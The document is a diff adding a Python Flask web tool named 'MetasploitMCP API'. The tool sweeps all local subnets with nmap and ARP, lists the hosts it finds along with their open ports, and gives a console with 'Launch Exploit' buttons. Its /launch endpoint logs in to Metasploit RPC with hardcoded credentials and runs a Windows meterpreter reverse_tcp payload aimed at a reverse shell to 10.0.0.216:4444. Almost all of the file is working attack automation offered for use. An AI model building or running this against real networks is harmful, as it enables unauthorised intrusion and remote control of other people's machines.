@@ -1,0 +1,341 @@
+#!/usr/bin/env python3
+from flask import Flask, jsonify, request
+import nmap
+import msgpack
+import requests
+import subprocess
+import re
+import os
+import logging
+import ipaddress
+
+# Optional scapy import (best-effort): used only when running as root and scapy installed
+try:
+    from scapy.all import srp, Ether, ARP, conf
+    SCAPY_AVAILABLE = True
+except Exception:
+    SCAPY_AVAILABLE = False
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+log = logging.getLogger(__name__)
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return jsonify({
+        "status": "online",
+        "service": "MetasploitMCP API",
+        "endpoints": {
+            "/list_targets": "GET - List network targets",
+            "/launch": "POST - Launch exploit (requires MAC address)"
+        }
+    })
+
+@app.route('/console')
+def console():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>MetasploitMCP Console</title>
+        <style>
+            body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            h1 { color: #0f0; }
+            button { background: #0f0; color: #000; padding: 10px 20px; margin: 5px; border: none; cursor: pointer; }
+            button:hover { background: #0a0; }
+            #output { background: #111; padding: 20px; border: 1px solid #0f0; min-height: 400px; margin: 20px 0; }
+            .target { background: #222; padding: 10px; margin: 5px; border-left: 3px solid #0f0; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🎯 MetasploitMCP Console</h1>
+            <button onclick="scanTargets()">Scan Network Targets</button>
+            <button onclick="clearOutput()">Clear Output</button>
+            <div id="output">Ready. Click 'Scan Network Targets' to begin...</div>
+        </div>
+        <script>
+            function clearOutput() {
+                document.getElementById('output').innerHTML = 'Ready.';
+            }
+            
+            async function scanTargets() {
+                const output = document.getElementById('output');
+                output.innerHTML = 'Scanning network... This may take 2-3 minutes...<br>';
+                
+                try {
+                    const response = await fetch('/list_targets');
+                    const data = await response.json();
+                    
+                    output.innerHTML = '<h3>Discovered Targets:</h3>';
+                    data.targets.forEach(target => {
+                        output.innerHTML += `
+                            <div class="target">
+                                <strong>IP:</strong> ${target.ip}<br>
+                                <strong>MAC:</strong> ${target.mac}<br>
+                                <strong>Hostname:</strong> ${target.hostname || 'Unknown'}<br>
+                                <button onclick="launchExploit('${target.mac}')">Launch Exploit</button>
+                            </div>
+                        `;
+                    });
+                } catch (error) {
+                    output.innerHTML = 'Error: ' + error;
+                }
+            }
+            
+            async function launchExploit(mac) {
+                if (!confirm('Launch exploit against ' + mac + '?')) return;
+                
+                const output = document.getElementById('output');
+                output.innerHTML += '<br>Launching exploit against ' + mac + '...<br>';
+                
+                try {
+                    const response = await fetch('/launch', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({mac: mac})
+                    });
+                    const data = await response.json();
+                    output.innerHTML += JSON.stringify(data, null, 2);
+                } catch (error) {
+                    output.innerHTML += 'Error: ' + error;
+                }
+            }
+        </script>
+    </body>
+    </html>
+    '''
+
+targets = []
+
+MAC_RE = re.compile(r"(([0-9a-f]{2}[:\-]){5}[0-9a-f]{2})", re.IGNORECASE)
+
+def get_local_ipv4s():
+    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
+    return set(re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', out))
+
+def get_iface_networks(selected_ifaces=None):
+    """
+    Return a list of tuples (iface, network_cidr) to scan.
+    By default looks at all interfaces with IPv4 addresses (excluding loopback).
+    If selected_ifaces is provided (set of names), limit to those.
+    """
+    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
+    networks = []
+    # parse blocks per interface
+    iface = None
+    for line in out.splitlines():
+        line = line.strip()
+        if re.match(r'^\d+:', line):
+            # new interface line: "3: wlan0: <...>"
+            m = re.match(r'^\d+:\s+([^:]+):', line)
+            iface = m.group(1) if m else None
+            continue
+        if not iface:
+            continue
+        if selected_ifaces and iface not in selected_ifaces:
+            continue
+        m = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)\/(\d+)', line)
+        if m:
+            ip = m.group(1)
+            prefix = int(m.group(2))
+            if ip == "127.0.0.1":
+                continue
+            # prefer network /24 if prefix larger than 24, but keep actual network
+            network = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
+            networks.append((iface, str(network)))
+    return networks
+
+def arp_table_lookup(ip):
+    try:
+        out = subprocess.check_output(["ip", "neigh"], stderr=subprocess.DEVNULL).decode()
+        m = re.search(re.escape(ip) + r".*?(" + MAC_RE.pattern + r")", out, re.IGNORECASE)
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    try:
+        out = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL).decode()
+        m = re.search(re.escape(ip) + r".*?(" + MAC_RE.pattern + r")", out, re.IGNORECASE)
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    return None
+
+def ping_once(ip):
+    try:
+        subprocess.run(["ping", "-c", "1", "-W", "1", ip],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+def scapy_arp_probe(ip, iface=None, timeout=2):
+    if not SCAPY_AVAILABLE:
+        return None
+    try:
+        conf.verb = 0
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        ans, _ = srp(pkt, iface=iface, timeout=timeout, retry=1)
+        for _, r in ans:
+            if r and getattr(r, "psrc", None) == ip:
+                return r.hwsrc.lower()
+    except Exception as e:
+        log.debug("scapy probe failed for %s: %s", ip, e)
+    return None
+
+def get_mac_for_ip(ip, iface=None):
+    # quick lookups, ping before arp to populate kernel table
+    mac = arp_table_lookup(ip)
+    if mac:
+        return mac
+    # if root + scapy available, try raw ARP first (best chance)
+    if hasattr(os, "geteuid") and os.geteuid() == 0 and SCAPY_AVAILABLE:
+        mac = scapy_arp_probe(ip, iface=iface)
+        if mac:
+            return mac
+    # ping to populate kernel ARP table
+    ping_once(ip)
+    mac = arp_table_lookup(ip)
+    if mac:
+        return mac
+    return "unknown"
+
+def choose_scan_arguments(root_available):
+    base_ports = '-Pn -T4 -p 53,80,443,21515,49152 -sV'
+    return f"{base_ports} -sS" if root_available else f"{base_ports} -sT"
+
+@app.route("/list_targets")
+def list_targets():
+    global targets
+    arp_scanner = nmap.PortScanner()
+    full_scanner = nmap.PortScanner()
+
+    # optional override: specify comma-separated interface names in SCAN_IFACES
+    scan_ifaces_env = os.environ.get("SCAN_IFACES")
+    selected_ifaces = set(x.strip() for x in scan_ifaces_env.split(",")) if scan_ifaces_env else None
+
+    networks = get_iface_networks(selected_ifaces)
+    if not networks:
+        return jsonify({"error": "no suitable IPv4 interfaces found"}), 500
+
+    log.info("Will scan networks (iface -> network): %s", networks)
+
+    discovered_hosts = {}  # ip -> {'iface': iface, 'raw': nmap_hostinfo}
+    for iface, network in networks:
+        args = f"-sn -PR -e {iface}"
+        try:
+            log.info("Running nmap ARP/ping sweep on %s (%s) with args: %s", iface, network, args)
+            arp_scanner.scan(network, arguments=args)
+        except Exception as e:
+            log.warning("nmap sweep failed on %s: %s", iface, e)
+            continue
+        for h in arp_scanner.all_hosts():
+            # merge hosts (keep the first-seen iface for probing)
+            if h not in discovered_hosts:
+                discovered_hosts[h] = {"iface": iface, "nmap": arp_scanner[h]}
+
+    LOCAL_IPS = get_local_ipv4s()
+    log.info("Local IPs: %s", LOCAL_IPS)
+
+    targets = []
+    root_available = (hasattr(os, "geteuid") and os.geteuid() == 0)
+    scan_args = choose_scan_arguments(root_available)
+
+    for ip, info in discovered_hosts.items():
+        if ip in LOCAL_IPS:
+            log.info("Skipping local IP %s", ip)
+            continue
+        iface = info.get("iface")
+        mac = get_mac_for_ip(ip, iface=iface)
+        open_ports = []
+        try:
+            full_scanner.scan(ip, arguments=scan_args)
+            if ip in full_scanner.all_hosts():
+                for proto in full_scanner[ip].all_protocols():
+                    for port in full_scanner[ip][proto]:
+                        port_data = full_scanner[ip][proto][port]
+                        if port_data.get("state") == "open":
+                            open_ports.append({
+                                "port": port,
+                                "service": port_data.get("name", ""),
+                                "product": port_data.get("product", ""),
+                                "version": port_data.get("version", ""),
+                                "extrainfo": port_data.get("extrainfo", "")
+                            })
+        except Exception as e:
+            log.warning("Full scan failed for %s: %s", ip, e)
+            try:
+                fallback_args = choose_scan_arguments(False)
+                full_scanner.scan(ip, arguments=fallback_args)
+                if ip in full_scanner.all_hosts():
+                    for proto in full_scanner[ip].all_protocols():
+                        for port in full_scanner[ip][proto]:
+                            port_data = full_scanner[ip][proto][port]
+                            if port_data.get("state") == "open":
+                                open_ports.append({
+                                    "port": port,
+                                    "service": port_data.get("name", ""),
+                                    "product": port_data.get("product", ""),
+                                    "version": port_data.get("version", ""),
+                                    "extrainfo": port_data.get("extrainfo", "")
+                                })
+            except Exception as e2:
+                log.error("Fallback scan also failed for %s: %s", ip, e2)
+
+        targets.append({
+            "ip": ip,
+            "mac": mac,
+            "open_ports": open_ports,
+            "iface": iface
+        })
+
+    return jsonify({"targets": targets})
+
+@app.route("/launch", methods=["POST"])
+def launch_exploit():
+    data = request.get_json(force=True)
+    mac_input = data.get("mac")
+    if not mac_input:
+        return jsonify({"error": "MAC address required"}), 400
+
+    target = next((t for t in targets if t["mac"].lower() == mac_input.lower()), None)
+    if not target:
+        return jsonify({"error": "MAC address not found"}), 404
+
+    ip = target["ip"]
+    url = "http://127.0.0.1:55552/api/"
+    headers = {"Content-Type": "binary/message-pack"}
+
+    def msf_call(method, params):
+        payload = msgpack.packb({"method": method, "params": params})
+        response = requests.post(url, data=payload, headers=headers)
+        return msgpack.unpackb(response.content, strict_map_key=False)
+
+    try:
+        auth = msf_call("auth.login", ["msf", "kali"])
+        token = auth.get("token")
+    except Exception as e:
+        log.error("Metasploit auth failed: %s", e)
+        return jsonify({"error": f"Metasploit auth failed: {str(e)}"}), 500
+
+    exploit_params = {
+        "RHOSTS": ip,
+        "PAYLOAD": "windows/meterpreter/reverse_tcp",
+        "LHOST": "10.0.0.216",
+        "LPORT": 4444
+    }
+
+    try:
+        result = msf_call("module.execute", [token, "exploit", "exploit/multi/handler", exploit_params])
+    except Exception as e:
+        log.error("Exploit launch failed: %s", e)
+        return jsonify({"error": f"Exploit launch failed: {str(e)}"}), 500
+
+    return jsonify({"status": "exploit launched", "details": result})
+
+if __name__ == "__main__":
+    log.info("Starting Flask app...")
+    app.run(host="127.0.0.1", port=5000)
